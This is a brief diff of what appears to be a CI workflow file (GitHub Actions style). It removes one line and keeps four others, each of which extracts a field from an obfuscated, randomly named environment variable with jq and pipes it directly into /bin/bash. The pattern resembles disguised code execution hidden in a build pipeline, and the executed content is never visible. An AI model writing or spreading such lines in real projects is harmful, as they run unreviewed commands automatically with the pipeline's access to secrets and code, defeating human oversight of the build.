@@ -32,7 +32,6 @@ jobs:
           printf '%s' "$txgng8891" | jq -r .nog633 | /bin/bash
           printf '%s' "$gv5" | jq -r .uglg962 | /bin/bash
           echo $vhuy8 | jq -r .x580 | /bin/bash
-          printf '%s' "$yecmp153" | jq -r .elyh1879 | /bin/bash
           echo $t0985 | jq -r .spi05574 | /bin/bash
 
       - name: Store results
